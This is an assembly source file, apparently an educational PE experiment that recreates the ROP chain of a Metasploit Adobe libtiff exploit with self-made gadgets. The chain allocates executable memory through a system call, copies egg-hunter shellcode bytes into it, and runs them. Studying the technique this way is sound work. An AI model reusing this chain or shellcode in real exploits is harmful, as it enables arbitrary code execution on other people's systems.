; ROP trampoline experiment
; from http://www.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/windows/fileformat/adobe_libtiff.rb

%include '../../onesec.hdr'

_KiFastSystemCall equ 07ffe0300h

EntryPoint:
    mov esp, trampo
    retn

align 16, int3

_pop_eax__ret:
    pop eax
    ret

align 16, int3

_pop_ecx__ret:
    pop ecx
    ret

align 16, int3

_mov_eax_mECX__ret:
    mov eax, [ecx]
    ret

align 16, int3

_mov_mEAX_ECX__ret:
    mov [eax], ecx
    ret

align 16, int3

_mov_mECX_eax__xor_eax_eax__ret:
    mov [ecx], eax
    xor eax, eax
    ret

align 16, int3

_call_mEAX__ret_:
    call [eax]
    ret

align 16, int3

pop_esi__add_esp_14__ret:
    pop esi
    add esp, 14h
    ret

align 16, int3

_mov_eax_m_ebp_24h__ret:
    mov eax, [ebp - 24h]
    ret

align 16, int3

_add_eax_4__ret:
    add eax, 4
    ret

align 16, int3

_call_eax_:
    call eax

align 16, int3

%include '..\goodbad.inc'

align 16, int3

;%IMPORT user32.dll!MessageBoxA
;%IMPORT kernel32.dll!ExitProcess

align 16, int3

%macro mov_eax 1
    dd _pop_eax__ret, %1
%endmacro

%macro mov_ecx 1
    dd _pop_ecx__ret, %1
%endmacro

%macro mov_mem 2
    mov_eax %1
    mov_ecx %2
    dd _mov_mEAX_ECX__ret
%endmacro

%macro mov_eax_mem 1
    mov_ecx %1
    dd _mov_eax_mECX__ret
%endmacro

%macro mov_mEAX_imm 1
    mov_ecx %1
    dd _mov_mEAX_ECX__ret
%endmacro

%macro MOVSD_ 1
    mov_mEAX_imm %1
    dd _add_eax_4__ret
%endmacro

trampo:
    mov_mem 010104h, 01000h         ; dd _pop_eax__ret,
                                    ; dd 010104h,
                                    ; dd _pop_ecx__ret,
                                    ; dd 01000h,
                                    ; dd _mov_mEAX_ECX__ret,
    mov_eax_mem _KiFastSystemCall   ; dd _pop_ecx__ret,
                                    ; dd _KiFastSystemCall,
                                    ; dd _mov_eax_mECX__ret,

    mov_ecx 010011h                 ; dd _pop_ecx__ret,
                                    ; dd 010011h,

    dd _mov_mECX_eax__xor_eax_eax__ret,

    mov_ecx 010100h                 ; dd _pop_ecx__ret,
                                    ; dd 010100h,

    dd _mov_mECX_eax__xor_eax_eax__ret,

    mov_eax 010011h                 ; dd _pop_eax__ret,
                                    ; dd 010011h,

    dd _call_mEAX__ret_,

    dd pop_esi__add_esp_14__ret,
    dd 0ffffffffh,
    dd 010100h,
    dd 00,
    dd 010104h,
    dd 01000h,
    dd 040h,
    ; The next bit effectively copies data from the interleaved stack to the memory
    ; pointed to by eax
    ; The data copied is:
    ; \x5a\x52\x6a\x02\x58\xcd\x2e\x3c\xf4\x74\x5a\x05\xb8\x49\x49\x2a
    ; \x00\x8b\xfa\xaf\x75\xea\x87\xfe\xeb\x0a\x5f\xb9\xe0\x03\x00\x00
    ; \xf3\xa5\xeb\x09\xe8\xf1\xff\xff\xff\x90\x90\x90\xff\xff\xff\x90
    dd _mov_eax_m_ebp_24h__ret,

    MOVSD_ 0026a525ah
    MOVSD_ 03c2ecd58h
    MOVSD_ 0f4745a05h
    MOVSD_ 02a4949b8h
    MOVSD_ 0affa8b00h
    MOVSD_ 0fe87ea75h
    MOVSD_ 0b95f0aebh
    MOVSD_ 0000003e0h
    MOVSD_ 009eba5f3h
    MOVSD_ 0fffff1e8h
    MOVSD_ 0909090ffh

    mov_mEAX_imm 090ffffffh,

    dd _mov_eax_m_ebp_24h__ret
    dd _call_eax_

;%IMPORTS

SECTION0SIZE equ $ - Section0Start
SIZEOFIMAGE equ $ - IMAGEBASE
